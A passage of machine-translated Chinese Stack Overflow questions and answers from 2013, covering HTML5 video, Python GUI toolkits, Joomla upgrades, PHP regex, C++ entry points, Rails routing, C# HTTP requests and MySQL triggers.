                public Drawable getDrawable(String source) {
                    String path =  source;

                    Drawable bmp = Drawable.createFromPath(path);
                    bmp.setBounds(0, 0, bmp.getIntrinsicWidth(), bmp.getIntrinsicHeight());

                    return bmp;
                }
            }, null)); 
```

# html - 支持所有视频格式的网络视频播放器

> ID：14379229
> 
> 赞同：1
> 
> 时间：2013-01-17T12:33:30.703
> 
> 标签：html, video

由于 HTML5 不支持所有视频格式，有没有其他基于 JS/JQ 的轻量级视频播放器，支持多种视频格式？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T20:06:29.397

如果您只是担心需要在某些浏览器中显示 .mp4、在其他地方显示 .webm 并在第三个中显示 .ogg 并且您拥有所有三种格式的源，您可以简单地将它们指定为标签上的备用源并基于 MIME 类型浏览器将显示它可以支持的

```
<video width="320" height="240" controls>
  <source src="movie.mp4" type="video/mp4">
  <source src="movie.ogg" type="video/ogg">
  <source src="movie.webm" type="video/webm">
  Sorry - Your browser does not support the HTML5 video tag.
</video> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T14:17:11.780

目前在 JavaScript 中实现视频播放器实际上是不可能的，因为您需要与硬件进行一些合作来加速播放 - 将像素一个一个地绘制到画布上远没有那么快。当前的“JavaScript 视频播放器”只是要求浏览器完成这项工作，然后他们会在周围绘制一些界面。

如果您担心浏览器中缺乏对编解码器的支持，您应该考虑浏览器插件，主要是 Flash，也许是 Silverlight。一些 HTML5 JS 库（例如[http://videojs.com](http://videojs.com)）提供 Flash 替代方案作为后备。

# python - 具有繁重样式的跨平台 GUI

> ID：14379231
> 
> 赞同：5
> 
> 时间：2013-01-17T12:33:33.737
> 
> 标签：python, user-interface, cross-platform

我正在考虑为 Windows/Linux/OS-X 编写一个桌面应用程序。GUI 的一项要求是我需要能够非常准确地设置它的样式。

那就是：我希望能够以我想要的方式为所有元素着色，精确定位元素像素，在元素的单边有边框，等等。与我编写 Web 应用程序时的可能性非常相似HTML + CSS 中的 UI。

我一直在环顾四周，但似乎很难找到这样的东西（+文档！）。

GTK 非常成熟，跨平台并且有很好的 C 文档。它具有多种语言的绑定，包括 Python 3，这是我现在选择的语言。即使您可以使用 CSS 对其进行样式设置，但您可以设置样式的方式和内容非常有限。

XUL 和 python 有一些第三方绑定，但他们不看，我应该如何措辞，很好的测试。

然后我可以选择在本地运行 python-web-server 和在浏览器中运行的应用程序。但我不确定我是否应该追求这一点，或者只是我内心的 Web 开发人员不想遵守。

基本上我希望能够构建一个漂亮的桌面应用程序。为什么这看起来如此困难？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T12:48:18.363

OS-X 与 Windows 具有非常独特和不同的外观和感觉，带有自制小部件的应用程序会感觉不同，并且通常看起来很奇怪甚至丑陋。在 Windows 98 前后，每家公司都制作了具有自己外观和感觉的应用程序。一个用于调制解调器，一个用于打印机，一个用于图形设置等等。它们本身可能看起来并不糟糕，但是当你拥有其中的几个时，加上原生的外观和感觉，整体印象就是丑陋。

所以，是的，这是您想要的网络开发人员。Web 是一种与原生 L&F 截然不同的动物，人们从一开始就已经习惯了差异、不连贯、故障、高延迟和丑陋。火焰和背景音乐。我的建议是：不要在本机应用程序上去那里。那么你不妨在网络上构建一些东西。

本机应用程序主要用于实现目标，而不是外观。快速做你想做的事（速度是最重要的功能），没有任何麻烦，淡化晦涩的外观，你将拥有一个很棒的原生应用程序！

除了 GTK，您还可以考虑使用这些工具包：

*   [wxWidgets](http://www.wxwidgets.org/)（[这里](http://www.wxpython.org/)是 Python 绑定）
*   [Qt](http://qt-project.org/)（带有一些旧版本的[绑定）](http://www.riverbankcomputing.com/software/pyqt/download)

还有[其他](http://en.wikipedia.org/wiki/List_of_widget_toolkits#High-level_widget_toolkits)的，但我不知道也没有可以推荐的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-17T15:21:12.370

在不讨论构建具有自定义外观和感觉的应用程序的利弊的情况下，我可以说带有[PyQt的](http://www.riverbankcomputing.co.uk/software/pyqt/intro)[Qt](https://qt.digia.com/)是非常可定制的。您可以使用 Qt 的类似 CSS 的样式表来定制小部件视觉外观的几乎所有方面。

如果您想查看示例，请查看[Twyla](https://www.temboo.com/download/twyla)，这是 Temboo 的可视化编程工具，它使用 Python、Qt 和 PyQt 构建并在 Windows 和 Mac（以及 Linux，尽管我们不正式支持它）上运行。（完全披露：我为 Temboo 工作。）您必须注册一个免费帐户才能下载它，但它是具有自定义样式的大型桌面应用程序的一个很好的例子。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-17T13:00:15.133

在我看来，[QtQuick](http://qt.digia.com/Product/qt-quick/)是解决您问题的好方法。它主要是为手机开发的，但似乎也适用于桌面应用程序。

它支持许多带有动画和自定义主题的“现代”用户界面。

QtQuick 使用 QML 作为它的编程语言，它与 JavaScript + HTML 非常相似。有一个名为[PySide](http://qt-project.org/wiki/PySide)的 API ，它允许您在 Python 3 中以非常 Python 的方式使用 Qt。它以 LGPL 的形式获得许可，因此应该与大多数项目兼容。如果需要商业许可和支持，可以使用[PyQt](http://www.riverbankcomputing.com/software/pyqt/intro)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T13:01:41.857

我同意乔纳斯的观点。不要重新发明轮子，坚持既定的东西。如果你真的需要创造一些视觉上更吸引人的东西，你可以尝试

*   [Adobe Air](http://en.wikipedia.org/wiki/Adobe_Air)或
*   [XUL](http://en.wikipedia.org/wiki/XUL)，例如在[Mozilla 应用程序框架中](http://en.wikipedia.org/wiki/Mozilla_application_framework)

这些都与 Python 无关，我敢打赌你会遇到一些问题，但它们应该满足你的要求。

# joomla - jupgrade 扩展在我的站点中不起作用

> ID：14379236
> 
> 赞同：0
> 
> 时间：2013-01-17T12:33:53.673
> 
> 标签：joomla, joomla2.5, joomla1.5

我正在尝试通过 jupgrade 将我的 joomla 网站（1.5.26）升级到 2.5 版，但它无法正常工作。Jupgrade 无法正常工作，并且在 jupgrade 中没有任何行为或发生任何事情。我在许多论坛上读到这是由于 mootools 插件问题。我已经在我的网站上下载并安装了最新版本的 mootools 插件，但它仍然无法正常工作，也仍然无法正常工作。我真的不知道如何解决它。任何人都可以帮我修复它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:50:22.073

首先卸载`jupgrade`然后删除表（**如果已创建** `jupgrade_categories`）`jupgrade_menus`、、、、`jupgrade_modules`。`jupgrade_steps`还要删除新 joomla 创建的所有表，然后**清除缓存**并**重新启动**服务器并安装`jupgrade`插件。点击升级中的设置按钮然后设置

跳过检查 - 是，启用迁移调试 - 是，启用`Mootools`版本调试 - 是

然后开始升级......

或者

jUpgrade 因存在各种故障和问题而臭名昭著。

解决下载问题的一种简单方法是直接从 Joomla 的站点下载您想要的 Joomla 版本，将其解压到您即将迁移的站点的 jUpgrade 目标文件夹中，然后更改 jUpgrade 的设置以跳过下载过程：

这对我有用。我认为这会奏效......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-05T00:12:42.533

我为我找到了解决方案！至于你，没有任何效果。所以我打开我的大脑，开始思考。Firebug 说：“未定义选项”，jupgrade javascript 已损坏。然后我在 joomla 插件目录中搜索，我找不到任何 mtupgrade 目录或 mtupgrade.php，但插件已列出并激活。所以我拿了一个完整版的 Joomla 1.5.26，这是我正在升级的版本，进入插件/系统目录，将 mtupgrade 目录复制到我的 Joomla 1.5.26 插件/系统安装中，而不是在插件/系统中复制 mtupgrade.php，不在 mtupgrade 目录中。去 jUpgrade 工作就像一个魅力！一些问题：Download 或 jUpgrade 在运行时可能会卡住。如果发生这种情况... 2 个解决方案。1\. 下载 Joomla 2.5 并解压到新的 /jupgrade 文件夹，你必须创建。2.让jUpgrade下载Joomla 2.5，当阻塞时，进入设置，单击“跳过下载”，然后重新加载 jUpgrade 插件。我确实喜欢这样，并且像魅力一样工作。

我希望我对你有所帮助。

马可。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-18T16:38:53.743

我完全同意@Trev。我也遇到了同样的问题并通过禁用一些插件来解决。您可以在控制台中检查以获取确切冲突的内容。我确定这一定是Jquery冲突的问题。BTW Jupgrate 非常好，令人惊奇的是它完全免费且响应迅速。

# php - PHP用函数的结果替换字符串

> ID：14379241
> 
> 赞同：0
> 
> 时间：2013-01-17T12:34:12.307
> 
> 标签：php, replace

我有一个包含 HTML 的 PHP 变量。我需要检查字符串的出现，并将该字符串替换为函数的结果。

该函数尚未编写，但只需要传递给它的一个变量，即产品的 ID。

例如，网站有产品，我希望用户能够在所见即所得的编辑器中输入一些东西`{{product=68}}`，它会显示一个包含该产品信息的预设 div 容器。在这种情况下，产品在数据库中的 ID 为 68，但它可以是从 1 到任何值的任何值。

我想过创建一个产品 ID 数组并搜索字符串的第一部分，但觉得这可能相当麻烦，我认为我们的常驻 reg exp 天才可能能够阐明我需要做什么。

所以问题是......我如何在字符串中搜索`{{product=XXX}}`XXX 可以是大于一的整数的出现次数，捕获该数字，并将其传递给创建替换字符串的函数，该替换字符串最终替换字符串的出现次数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:42:23.403

这是一个匹配 {{product=##}} 的正则表达式（无论您输入多少位数）：

```
{{product=([0-9]+)}} 
```

编辑：对不起，没有看到你想要从 1 开始：

```
{{product=([1-9][0-9]*)}} 
```

如果要捕获该数字，请像这样：

```
$string = '{{product=68}}';
preg_match_all( '%{{product=([1-9][0-9]*)}}%', $string, $matches );
$number = (int) $matches[1][0]; 
```

为了让您更好地理解 preg_match_all，这是以下内容`$matches`：

```
array
  [0] => array // An array with strings that matched the whole regexp
    [0] => '{{product=68}}'
  [1] => array // An array with strings that were in the first "match group", indicated by paranthesis in the regexp
    [0] => '68' 
```

例如`$matches`，如果你有字符串 '{{product=68}}{{product=70}}'，它看起来像这样：

```
array
  [0] => array
    [0] => '{{product=68}}'
    [1] => '{{product=70}}'
  [1] => array
    [0] => '68'
    [1] => '70' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:24:52.137

为你做了一个小班，应该可以满足你的需要。

```
<?php
class textParser{
    const _pattern = '/{{([a-z\-_]+)=([0-9]+)}}/';
    static protected $_data = false;

    static public function setData($data){
        self::$_data = $data;
    }
    static function parseStr($str){
        // Does a preg_replace according to the 'replace' callback, on all the matches
        return preg_replace_callback(self::_pattern, 'self::replace', $str);
    }
    protected static function replace($matches){
        // For instance, if string was {{product=1}}, we check if self::$_data['product'][1] is set
        // If it is, we return that
        if(isset(self::$_data[$matches[1]][$matches[2]])){
            return self::$_data[$matches[1]][$matches[2]];
        }
        // Otherwise, we just return the matched string
        return $matches[0];
    }
}
?> 
```

## 单元测试/基本用法

```
<?php
// User generated text-string
$text = "Item {{product=1}} and another {{category=4}} and a category that doesnt exist: {{category=15}}";
// This should probably come from a database or something
$data = array(
    "product"=>array(
        1=>"<div>Table</div>"
      , 2=>"<div>Tablecloth</div>"
    )
  , "category"=>array(
        4=>"Category stuff"
    )
);
// Setting the data
textParser::setData($data);
// Parsing and echoing
$formated = textParser::parseStr($text);
echo $formated;
// Item <div>Table</div> and another Category stuff and a category that doesnt exist: {{category=15}}
?> 
```

# c++ - 通过函数指针定义“main”

> ID：14379247
> 
> 赞同：3
> 
> 时间：2013-01-17T12:34:24.453
> 
> 标签：c++, c, linker, linker-scripts

在 C++ 中，main 是否可以由函数指针定义？例如：

```
int f(int, char**) {
    return 0;
}

int (*main)(int, char**) = &f; 
```

此代码可以正确编译和链接，但在运行时会触发分段错误。我相信这可能是因为它试图将函数指针的值作为代码执行。

此外，如果在纯 C++ 中不可能，那么可以通过 gcc 的非标准功能来实现（可能以某种方式更改导出符号的类型）。

最后，如果使用 gcc 指令无法实现，是否可以使用自定义链接器脚本来完成？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T12:38:33.017

C++ 标准的第 3.6.1/1 段说：

*“一个程序应包含一个名为 main 的全局**函数**，它是程序的指定开始”*

这使得指针声明非法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-17T12:37:56.280

我无法想象你为什么想要这个，但不，这绝对不可能用纯 C++ 实现。

如果你真的需要这样的东西，只需使用你调用的函数指针作为 main 中的第一个命令。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-01-17T12:37:54.617

我相信您尝试做的事情在 C++ 中是不可能的。我能想到的最简单的解决方案是简单地调用`f`你的 main：

```
int f(int, char**) {
    return 0;
}

int main(int argc, char** argv) {
  return f(argc, argv);
} 
```

我也无法想象上述解决方案不起作用的场景。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-17T13:20:37.733

如果你在 linux 上，并且使用 gcc，你可以声明`main`为[`alias`](http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html)任何其他函数。

例如，以下代码有效（至少使用 gcc，未使用 g++ 测试）：

```
int f(int argc, char* argv[]) {
    printf("hello world\n");
    return 0;
}

int main(int argc, char* argv[]) __attribute__ ((alias("f"))); 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-01-17T12:41:36.747

使用 GCC，您可以使用选项将选项传递给链接器`-Wl`。然后您可以使用`--entry`链接器的选项来指定应首先调用哪个函数。

**警告：**这**不会**达到您的预期！程序的入口函数实际上*不是*`main`函数，而是另一个函数，它建立运行时环境，*然后*调用你的`main`函数。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-17T12:38:35.837

`main` ~~是 C 和 C++ 中的关键字，并在程序~~中作为函数指针名称被覆盖。main 定义了执行的入口点。因此，您的程序没有该功能并覆盖`main`它的段错误。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-01-17T13:34:29.407

另一种“肮脏”的方法是使用汇编创建一个假函数 & 作为该函数的第一条指令，跳转到`f`.

下面是目标的`gcc`具体代码`intel`：

```
asm(".globl main");           // main is not static
asm(".type main, @function"); // main is a 'function'
asm("main: jmp f");           // main starts here. jump to `f`

int g(){ //Some random function may be present in between "main" & "f"...
    puts("hello universe");
}

int f(int argc, char* argv[]) {
    int i;
    puts("hello world");
    printf("%d arguments given\n",argc - 1);
    for(i=0;i<argc;i++) puts (argv[i]);
    g();
    return 0;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-03-22T12:10:45.323

> int (*main)(int, char**) = &f;

看起来不正确。

关于什么

```
int (*main)(int, char**) = f; 
```

?

# iphone - 在我的 iOS 应用程序中导入我的 sql 文件

> ID：14379249
> 
> 赞同：0
> 
> 时间：2013-01-17T12:34:24.390
> 
> 标签：iphone, ios, file, sqlite, import

我有我的 Mac OSX 的 SQLite Studio，我在那里创建我的模式，在 MySQL 中我使用 DBFork Manager 一个案例工具来制作我的模式，我导出 sql 文件然后导入 MySQL 服务器，所以我想为我的 iOS 做同样的事情使用 SQLite 的应用程序。

我的意思是，我制作了我的 SQLite Schema，然后我需要从 *.sql 文件导入我的应用程序，我使用 SQL 字符串给出我的代码示例......希望你能帮助我！

```
- (void)viewDidLoad {
NSString *docsDir;
NSArray *dirPaths;

// Get the documents directory
dirPaths = NSSearchPathForDirectoriesInDomains(
                                               NSDocumentDirectory, NSUserDomainMask, YES);

docsDir = dirPaths[0];

// Build the path to the database file
_databasePath = [[NSString alloc]
                 initWithString: [docsDir stringByAppendingPathComponent:
                                  @"contacts.db"]];

NSFileManager *filemgr = [NSFileManager defaultManager];

if ([filemgr fileExistsAtPath: _databasePath ] == NO)
{
    const char *dbpath = [_databasePath UTF8String];

    if (sqlite3_open(dbpath, &_contactDB) == SQLITE_OK)
    {
        char *errMsg;
        const char *sql_stmt =
        "CREATE TABLE IF NOT EXISTS CONTACTS (ID INTEGER PRIMARY KEY AUTOINCREMENT, NAME TEXT, ADDRESS TEXT, PHONE TEXT)";

        if (sqlite3_exec(_contactDB, sql_stmt, NULL, NULL, &errMsg) != SQLITE_OK)
        {
            _status.text = @"Failed to create table";
        }
        sqlite3_close(_contactDB);
    } else {
        _status.text = @"Failed to open/create database";
    }
}
[super viewDidLoad]; 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T19:02:43.883

我假设您在 SQLite 中有一个数据库文件，并且想要安装它以在您的 iPhone 上使用。如果你在你的程序中编译它，那么它将在文件包中。然而，这是只读的，所以如果你想改变你的数据库，你需要将它复制到 iphone 的文档目录（或另一个更合适的目录）。查看此 stackoverflow 问题的答案：

[iPhone 上的 SQLite](https://stackoverflow.com/questions/5042836/how-should-i-specify-the-path-for-an-sqlite-db-in-an-iphone-project)

# ruby-on-rails - 将数据从表单发布到不同的控制器并重定向回来

> ID：14379259
> 
> 赞同：3
> 
> 时间：2013-01-17T12:35:02.957
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我正在尝试构建一个表单，将数据发布到另一个控制器/操作，然后重定向回另一个页面。

我的模板与表格：

```
<%= form_for @url, :url => { :controller => "url", :action => "create" }, :html => {:method => :post} do |f| %>
    <%= f.text_field :url, :placeholder => "http://" %>
   <%= f.submit "Kürzen", :class => "btn" %>
<% end %> 
```

我的 url_controller：

```
class UrlController < ApplicationController
  def create
    redirect_to shorturl_path
  end
end 
```

我的路线：

```
Ssurl::Application.routes.draw do
  get 'shorturl' => 'landingpage#shorturl', :as => :shorturl
  post '/url/create' => 'url#create'
  root :to => 'landingpage#index', :as => :landingpage
end 
```

当我提交表单时，页面会使用表单的获取参数重新加载？所以有2个错误：

1.  表单使用get而不是post？
2.  重定向不起作用

怎么了？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:51:54.360

看起来您正试图`form_for`通过指定控制器和操作在您的 URL 中生成一个 URL，但您没有在您的 routes.rb 中映射此路由。

所以你有两个选择。首先是对 中的 URL 进行“硬编码” `form_for`，如下所示：

```
<%= form_for @url, :url => "/url/create", :html => {:method => :post} do |f| %> 
```

但更好的解决方案是将您的路线变成 RESTful 形式。

你可以这样做：

```
Ssurl::Application.routes.draw do
  get 'shorturl' => 'landingpage#shorturl', :as => :shorturl
  resource :url, :only => [:create]
  root :to => 'landingpage#index', :as => :landingpage
end 
```

它将使用 POST http 方法创建一个 RESTful 创建路由。所以你`form_for`会看起来像这样：

```
<%= form_for @url do |f| %> 
```

干净多了！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:17:40.873

用户`url_for`访问不同控制器的操作-

```
form_for @url, :url => url_for(:controller => 'url', :action => 'create') 
```

**对于重定向问题 -**

控制器并不意味着相互通信。如果你想在创建一个 url 后做一些事情，让它成为模型上的一个方法，并从 UrlController 调用它。您甚至可以向模型添加 after_save 回调，但请注意回调可能会导致混乱，尤其是在它们很复杂的情况下。

仔细考虑哪种方法适用于哪个对象。它属于哪里？控制器应该相当直接：获取资源并显示它（对于 GET 请求），或者执行一个操作并重定向回 GET 页面。如果您想做的事情也不属于模型，请创建一个服务类或不同的模型。

# jquery - 解析 ASP Web API JSON 结果：日期时间

> ID：14379260
> 
> 赞同：0
> 
> 时间：2013-01-17T12:35:03.010
> 
> 标签：jquery, asp.net-web-api, jquery-ui-datepicker

我正在使用 jQuery ajax 来调用 Web API 服务。响应是这样的 Json

```
 {"Id":2,"UserName":"first.last@email.com","CreatedDate":"2013-01-17T12:40:26.043","ExpireDate":"2023-01-17T12:40:26.043"}] 
```

问题是：如何在没有时间的情况下将 Createddate 和 Expiredate 绑定到 jQuery DatePicker 字段？所以基本上我需要设置 datepicker 字段的值，例如：yyyy-mm-dd。问题是如何解析仅返回 yyyy-mm-dd 的日期时间格式**2013-01-17T12:40:26.043 ？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:44:15.457

您可以简单地解析它：

```
var yourDate = '2013-01-17T12:40:26.043';

var parsedDate = $.datepicker.parseDate('yyyy-mm-dd', yourDate.substr(0, 10)); 
```

# jquery - 将多个选定的数据项从一个网格移动到另一个 jquery

> ID：14379262
> 
> 赞同：0
> 
> 时间：2013-01-17T12:35:07.193
> 
> 标签：jquery, grid, kendo-ui

我需要关于按钮的帮助...其中两个按钮可以正常工作（#levo 和#desno）但不能完全正常工作，另外两个根本不工作。

我希望他们如何工作？我有两个烦恼：

1）当我按下按钮#levo时，它会将选定的dataItem从第一个网格移动到另一个网格，但是如果我从第一个网格中选择多个dataItem，它只会移动第一个（另一个按钮#desno也是如此）

2）当我按下按钮#sitelevo时，我希望第一个网格中的所有数据项都移动到另一个，没有选择（#sitedesno也是如此）

谁能帮我？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T21:57:58.950

恐怕问题在于`jQuery.each()`枚举不可变项。这意味着您不能在执行时删除项目，`each`因为这会改变列表。

示例：尝试评论您从中删除项目的行`sourcegrid`并将添加项目保留到`destinationgrid`：您将看到项目已插入到目标中。

```
sourcegrid.select().each(function () {
    dataItem = sourcegrid.dataItem($(this));
    // sourcegrid.dataSource.remove(dataItem);
    destinationgrid.dataSource.add(dataItem);
    return null;
}); 
```

# c# - 无法保存带有特殊字符的文本文件

> ID：14379263
> 
> 赞同：-1
> 
> 时间：2013-01-17T12:35:16.850
> 
> 标签：c#, file, windows-phone, isolatedstorage

我有一个程序，您可以在其中写笔记并将它们保存在 .txt 文件中。每个笔记都有一个标题和一个文本。注释的标题是不带“.txt”后缀的文件名。所以在我的程序中有一个包含所有笔记标题的列表框，点击标题你可以阅读笔记。我的问题是我不能用这些字符写标题： \ / : * ？" < > | 因为它们不允许出现在文件名中。

我该如何解决这个问题？我认为一个解决方案可能是创建一个仅包含文件名的新 .txt 文件，然后根据行号将文件名与注释相关联。

有更简单的解决方案吗？如果是的话，你能告诉我吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:49:24.487

单独索引文件的优点是您可以轻松获取所有标题。缺点是它可能会过时，除非您非常小心，并且您限制了对底层文件系统的访问。

就个人而言，我可能很想将每个文本文件的第一行作为标题，并将文件名作为经过*清理*的标题。这意味着您可以非常快速地显示***非常接近***实际标题的内容，但是您可以选择异步循环文件并更新*实际*标题（如果它们不同）......即如果用户输入的标题是“what < do ！ 我愿意？” 他们可能会非常简短地看到“我要做什么”，很快就会被“做什么<做什么！我做什么？”所取代。- 并且没有索引文件损坏的风险。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:40:19.900

您可以使用独特的字符串维护特殊字符字典，例如：

```
Dictionary<string, string> specialCharDictionary = new Dictionary<string, string>();
specialCharDictionary.Add("\\", "Slash");
specialCharDictionary.Add("/", "BSlash");
//.... 
```

然后使用它来创建和访问文件名。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:40:29.927

您可以对文件名进行[base-64 编码，](http://arcanecode.com/2007/03/21/encoding-strings-to-base64-in-c/)也可以将文件设为 XML 而不是纯文本，并对实体进行编码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T12:41:44.263

标题是用户给的吗？如果是这样，有一个简单的方法来验证标题。只需检查给定的标题是否包含被禁止的字符之一。然后您可以删除它们并使用剥离的结果，或者您可以向用户显示一条错误消息，说明这些字符是不允许的。

[这个问题](https://stackoverflow.com/questions/4503542/check-for-special-characters-in-a-string)提供了有关在字符串中查找特殊字符的答案。希望这可以帮助！

# c# - 我可以使用 C# Http 类为我的应用程序形成 Http 请求吗？

> ID：14379265
> 
> 赞同：1
> 
> 时间：2013-01-17T12:35:25.403
> 
> 标签：c#, sockets, windows-phone

我正在创建一个使用套接字与其他手机通信的 Windows 手机应用程序。为了通过套接字发送数据，我使用的是 Http 协议。现在我正在手动创建 http 请求（附加字符串）。我可以使用 C# 类来形成 Http 请求并通过我的套接字发送数据吗？

我也可以使用 C# 类来解析我从其他移动设备通过套接字获取的 http 数据。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:37:12.707

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;

namespace WebserverInteractionClassLibrary
{
    public class RequestManager
    {
        public string LastResponse { protected set; get; }

        CookieContainer cookies = new CookieContainer();

        internal string GetCookieValue(Uri SiteUri,string name)
        {
            Cookie cookie = cookies.GetCookies(SiteUri)[name];
            return (cookie == null) ? null : cookie.Value;
        }

        public string GetResponseContent(HttpWebResponse response)
        {
            if (response == null)
            {
                throw new ArgumentNullException("response");
            }
            Stream dataStream = null;
            StreamReader reader = null;
            string responseFromServer = null;

            try
            {
                // Get the stream containing content returned by the server.
                dataStream = response.GetResponseStream();
                // Open the stream using a StreamReader for easy access.
                reader = new StreamReader(dataStream);
                // Read the content.
                responseFromServer = reader.ReadToEnd();
                // Cleanup the streams and the response.
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {                
                if (reader != null)
                {
                    reader.Close();
                }
                if (dataStream != null)
                {
                    dataStream.Close();
                }
                response.Close();
            }
            LastResponse = responseFromServer;
            return responseFromServer;
        }

        public HttpWebResponse SendPOSTRequest(string uri, string content, string login, string password, bool allowAutoRedirect)
        {
            HttpWebRequest request = GeneratePOSTRequest(uri, content, login, password, allowAutoRedirect);
            return GetResponse(request);
        }

        public HttpWebResponse SendGETRequest(string uri, string login, string password, bool allowAutoRedirect)
        {
            HttpWebRequest request = GenerateGETRequest(uri, login, password, allowAutoRedirect);
            return GetResponse(request);
        }

        public HttpWebResponse SendRequest(string uri, string content, string method, string login, string password, bool allowAutoRedirect)
        {
            HttpWebRequest request = GenerateRequest(uri, content, method, login, password, allowAutoRedirect);
            return GetResponse(request);
        }

        public HttpWebRequest GenerateGETRequest(string uri, string login, string password, bool allowAutoRedirect)
        {
            return GenerateRequest(uri, null, "GET", null, null, allowAutoRedirect);
        }

        public HttpWebRequest GeneratePOSTRequest(string uri, string content, string login, string password, bool allowAutoRedirect)
        {
            return GenerateRequest(uri, content, "POST", null, null, allowAutoRedirect);
        }

        internal HttpWebRequest GenerateRequest(string uri, string content, string method, string login, string password, bool allowAutoRedirect)
        {
            if (uri == null)
            {
                throw new ArgumentNullException("uri");
            }
            // Create a request using a URL that can receive a post. 
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(uri);
            // Set the Method property of the request to POST.
            request.Method = method;
            // Set cookie container to maintain cookies
            request.CookieContainer = cookies;
            request.AllowAutoRedirect = false;
            // If login is empty use defaul credentials
            if (string.IsNullOrEmpty(login))
            {
                request.Credentials = CredentialCache.DefaultNetworkCredentials;
            }
            else
            {
                request.Credentials = new NetworkCredential(login, password);
            }
            if (method == "POST")
            {
                // Convert POST data to a byte array.
                byte[] byteArray = Encoding.UTF8.GetBytes(content);
                // Set the ContentType property of the WebRequest.
                request.ContentType = "application/x-www-form-urlencoded";
                // Set the ContentLength property of the WebRequest.
                request.ContentLength = byteArray.Length;
                // Get the request stream.
                Stream dataStream = request.GetRequestStream();
                // Write the data to the request stream.
                dataStream.Write(byteArray, 0, byteArray.Length);
                // Close the Stream object.
                dataStream.Close();
            }
            return request;
        }

        internal HttpWebResponse GetResponse(HttpWebRequest request)
        {
            if (request == null)
            {
                throw new ArgumentNullException("request");
            }
            HttpWebResponse response = null;
            try
            {
                response = (HttpWebResponse)request.GetResponse();                
                cookies.Add(response.Cookies);                
                // Print the properties of each cookie.
                Console.WriteLine("\nCookies: ");
                foreach (Cookie cook in cookies.GetCookies(request.RequestUri))
                {
                    Console.WriteLine("Domain: {0}, String: {1}", cook.Domain, cook.ToString());
                }
            }
            catch (WebException ex)
            {
                Console.WriteLine("Web exception occurred. Status code: {0}", ex.Status);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return response;
        }

    }
} 
```

这是一个不错的代码片段，您可以将其用作[此问题](https://stackoverflow.com/questions/3892042/create-http-post-request-and-receive-response-using-c-sharp-console-application)的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:38:57.270

到目前为止，最简单/最快的方法是使用[WebClient](http://msdn.microsoft.com/en-us/library/system.net.webclient.aspx)。如果您需要更多控制权，还可以使用[HttpWebRequest](http://msdn.microsoft.com/en-gb/library/system.net.httpwebrequest.aspx)。

# mysql - 2个表之间的映射

> ID：14379268
> 
> 赞同：0
> 
> 时间：2013-01-17T12:35:47.513
> 
> 标签：mysql, spring, hibernate

我有两张桌子，一张是`feestructure`，第二张是`feedetails`

`feedetails`将`feestructure`表 id 作为外键和一个`amount`字段

所以我的问题是，当我在字段中输入重复的外键`feedetails`和任何值时，应该计算`amount`对应总和的重复 id 的数量，并且该总和应该显示在表中的字段中。 `amount``amount``amount``feestructure`

我在我的项目中使用 spring、hibernate 和 MySQL。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:44:02.967

我不知道为什么当你可以从一个简单的查询中导出它时，你需要存储`feedetails`a的总量。但是，如果您有理由这样做，您可以尝试使用 a来处理表中的插入过程。`feestructure``GROUP``TRIGGER``feedetails`

此链接可能有助于[插入触发器之前](http://www.java2s.com/Tutorial/MySQL/0260__Trigger/Beforeinserttrigger.htm)

# android - 如何关闭安卓设备

> ID：14379272
> 
> 赞同：2
> 
> 时间：2013-01-17T12:36:04.953
> 
> 标签：android, shutdown

> **可能重复：**
> [以编程方式关闭 Android 手机](https://stackoverflow.com/questions/3745523/programmatically-switching-off-android-phone)

如何通过我的应用程序关闭 Android 设备？是否可以关闭 Android 设备？如何 ？

有要求吗？

# javascript - 如何遍历 JavaScript 对象？

> ID：14379274
> 
> 赞同：551
> 
> 时间：2013-01-17T12:36:15.157
> 
> 标签：javascript, loops, object, iteration, javascript-objects

我在 JavaScript 中有一个对象：

```
{
    abc: '...',
    bca: '...',
    zzz: '...',
    xxx: '...',
    ccc: '...',
    // ...
} 
```

我想使用`for`循环来获取它的属性。而且我想分部分迭代它（不是一次所有对象属性）。

使用简单的数组，我可以使用标准`for`循环来完成：

```
